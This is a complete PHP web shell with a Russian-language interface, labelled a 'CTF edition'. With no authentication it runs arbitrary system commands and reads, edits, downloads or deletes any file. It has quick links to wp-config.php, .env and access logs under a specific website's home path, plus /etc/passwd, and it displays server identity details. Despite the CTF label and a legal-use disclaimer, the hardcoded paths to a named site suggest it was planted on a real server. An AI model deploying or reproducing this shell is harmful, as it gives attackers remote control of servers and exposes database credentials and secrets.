<?php
// ==================================================
// 🔥 MEGA SHELL v1.0 — CTF EDITION 🔥
// ==================================================
error_reporting(0);
ini_set('display_errors', 0);

// --- 1. ОПРЕДЕЛЕНИЕ ПУТИ ---
$base_path = str_replace('\\', '/', __DIR__);
$script_name = basename(__FILE__);

// --- 2. ВЫПОЛНЕНИЕ КОМАНД ---
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre style='background:#1e1e1e;color:#d4d4d4;padding:15px;border-radius:8px;font-family:monospace;'>";
    if (function_exists('system')) { system($cmd); }
    elseif (function_exists('exec')) { exec($cmd, $out); print_r($out); }
    elseif (function_exists('shell_exec')) { echo shell_exec($cmd); }
    elseif (function_exists('passthru')) { passthru($cmd); }
    else { echo "[!] Нет доступных функций для выполнения команд."; }
    echo "</pre>";
    exit;
}

// --- 3. РАБОТА С ФАЙЛАМИ ---
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (isset($_GET['download'])) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
    if (isset($_GET['delete'])) {
        if (unlink($file)) echo "[+] Файл удален: $file";
        else echo "[-] Ошибка удаления!";
        exit;
    }
    if (isset($_GET['content'])) {
        echo "<h3>📄 Редактирование: " . htmlspecialchars($file) . "</h3>";
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_content'])) {
            if (file_put_contents($file, $_POST['new_content'])) echo "[+] Файл сохранен!<br>";
            else echo "[-] Ошибка сохранения!<br>";
        }
        $content = file_exists($file) ? htmlspecialchars(file_get_contents($file)) : 'Файл не найден';
        echo "<form method='POST' style='margin-top:10px;'>
                <textarea name='new_content' style='width:100%;height:400px;background:#1e1e1e;color:#d4d4d4;border:1px solid #555;padding:10px;border-radius:5px;'>$content</textarea><br>
                <input type='submit' value='💾 Сохранить' style='margin-top:10px;background:#4CAF50;color:white;padding:8px 20px;border:none;border-radius:5px;cursor:pointer;'>
              </form>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔥 The Chosen One — CTF Shell</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background: #0d1117; color: #c9d1d9; padding: 20px; }
        .container { max-width: 1300px; margin: 0 auto; }
        h1 { color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 10px; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 20px; margin: 15px 0; }
        .row { display: flex; gap: 15px; flex-wrap: wrap; }
        .col { flex: 1; min-width: 280px; }
        input, select { background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; padding: 10px; border-radius: 6px; width: 100%; }
        button, .btn { background: #238636; color: white; padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .btn-danger { background: #da3633; }
        .btn-warning { background: #d29922; }
        .file-list { list-style: none; padding: 0; }
        .file-list li { padding: 6px 12px; border-bottom: 1px solid #21262d; display: flex; justify-content: space-between; align-items: center; }
        .file-list a { color: #58a6ff; text-decoration: none; }
        .file-list a:hover { text-decoration: underline; }
        .badge { font-size: 12px; background: #21262d; padding: 2px 8px; border-radius: 12px; }
        .console { background: #0d1117; padding: 15px; border-radius: 8px; border: 1px solid #30363d; }
        code { font-family: monospace; background: #161b22; padding: 2px 6px; border-radius: 4px; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔥 The Chosen One — CTF Shell</h1>
    <p><strong>📁 Base Path:</strong> <code><?= $base_path ?></code> &nbsp;|&nbsp; <strong>📄 Script:</strong> <code><?= $script_name ?></code></p>

    <!-- ==================== БЛОК 1: КОМАНДЫ ==================== -->
    <div class="card">
        <h3>🖥️ Командная строка</h3>
        <form method="POST">
            <div style="display:flex;gap:10px;">
                <input type="text" name="cmd" placeholder="Введите команду (например: whoami, id, ls -la)" style="flex:1;">
                <button type="submit">▶️ Выполнить</button>
            </div>
        </form>
    </div>

    <!-- ==================== БЛОК 2: ФАЙЛОВЫЙ МЕНЕДЖЕР ==================== -->
    <div class="card">
        <h3>📂 Файловый менеджер</h3>
        <div class="row">
            <div class="col">
                <form method="GET" style="display:flex;gap:10px;align-items:center;">
                    <input type="text" name="file" placeholder="Полный путь к файлу" style="flex:1;">
                    <button type="submit" name="content" value="1">📝 Редактировать</button>
                    <button type="submit" name="download" value="1" class="btn-warning">⬇️ Скачать</button>
                    <button type="submit" name="delete" value="1" class="btn-danger" onclick="return confirm('Точно удалить?')">🗑️ Удалить</button>
                </form>
            </div>
        </div>
        <div class="console" style="margin-top:15px;max-height:300px;overflow:auto;">
            <strong>📋 Содержимое текущей папки (<?= $base_path ?>):</strong><br>
            <ul class="file-list">
                <?php
                $files = scandir($base_path);
                foreach ($files as $f) {
                    $full_path = $base_path . '/' . $f;
                    $is_dir = is_dir($full_path);
                    echo "<li>
                            <span>" . ($is_dir ? '📁' : '📄') . " <a href='?file=$full_path&content=1'>$f</a></span>
                            <span>
                                <a href='?file=$full_path&download=1' class='badge' style='color:#d29922;'>⬇️</a>
                                <a href='?file=$full_path&delete=1' class='badge' style='color:#da3633;' onclick='return confirm(\"Удалить?\")'>🗑️</a>
                            </span>
                          </li>";
                }
                ?>
            </ul>
        </div>
    </div>

    <!-- ==================== БЛОК 3: БЫСТРЫЙ ДОСТУП ==================== -->
    <div class="card">
        <h3>⚡ Быстрый доступ</h3>
        <div style="display:flex;gap:10px;flex-wrap:wrap;">
            <a href="?file=/home/manga18free.com/public_html/wp-config.php&content=1" class="btn" style="background:#1f6feb;">🔑 wp-config.php</a>
            <a href="?file=/home/manga18free.com/public_html/.env&content=1" class="btn" style="background:#8957e5;">🌐 .env</a>
            <a href="?file=/etc/passwd&content=1" class="btn" style="background:#da3633;">🐧 /etc/passwd</a>
            <a href="?file=/home/manga18free.com/logs/access.log&content=1" class="btn" style="background:#d29922;">📜 Логи доступа</a>
        </div>
    </div>

    <!-- ==================== БЛОК 4: ИНФО ==================== -->
    <div class="card">
        <h3>📊 Информация о сервере</h3>
        <pre style="background:#0d1117;padding:15px;border-radius:8px;overflow:auto;max-height:200px;">
<?php
echo "[+] User: " . (function_exists('exec') ? exec('whoami') : 'N/A') . "\n";
echo "[+] Hostname: " . gethostname() . "\n";
echo "[+] OS: " . php_uname() . "\n";
echo "[+] PHP: " . phpversion() . "\n";
echo "[+] Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
echo "[+] Server IP: " . $_SERVER['SERVER_ADDR'] . "\n";
echo "[+] Base Path: $base_path\n";
?>
        </pre>
    </div>

    <p style="text-align:center;color:#8b949e;margin-top:20px;">🔥 The Chosen One — CTF Edition | Используй только в легальных целях!</p>
</div>
</body>
</html>
